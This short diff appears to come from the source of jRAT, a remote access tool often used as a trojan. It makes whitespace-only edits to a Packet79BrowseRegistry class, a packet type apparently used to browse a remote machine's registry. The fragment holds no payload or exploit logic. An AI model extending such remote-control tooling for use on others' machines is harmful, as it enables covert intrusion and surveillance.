@@ -4,11 +4,10 @@ import java.io.DataOutputStream;
 
 import pro.jrat.Slave;
 
-
 public class Packet79BrowseRegistry extends AbstractOutgoingPacket {
-	
+
 	private String location;
-	
+
 	public Packet79BrowseRegistry(String location) {
 		this.location = location;
 	}
